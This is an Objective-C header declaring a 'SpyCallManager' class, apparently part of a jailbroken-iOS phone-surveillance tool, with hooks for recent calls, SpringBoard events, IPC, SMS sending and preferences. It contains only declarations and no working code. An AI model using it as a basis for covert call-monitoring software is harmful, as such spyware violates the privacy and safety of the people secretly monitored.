//
//  SpyCallManager.h
//  SpyCall
//
//  Created by Makara Khloth on 3/14/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "MessagePortIPCReader.h"

@protocol SMSSender;
@protocol PreferenceManager;

@class RecentCallNotifier;
@class SpringBoardDidLaunchNotifier;
@class SpringBoardKilledNotifier;

@interface SpyCallManager : NSObject <MessagePortIPCDelegate> {
@private
	RecentCallNotifier				*mRecentCallNotifier;
	SpringBoardDidLaunchNotifier	*mSBDidLaunchNotifier;
    SpringBoardKilledNotifier       *mSBKillNotifier;
	MessagePortIPCReader			*mMessagePortReader;
	id <SMSSender>					mSMSSender;			// Not own
	id <PreferenceManager>			mPreferenceManager; // Not own
}

@property (nonatomic, assign) id <SMSSender> mSMSSender;
@property (nonatomic, assign) id <PreferenceManager> mPreferenceManager;

- (id) init;

- (void) start;
- (void) stop;

- (void) disableSpyCall;

@end
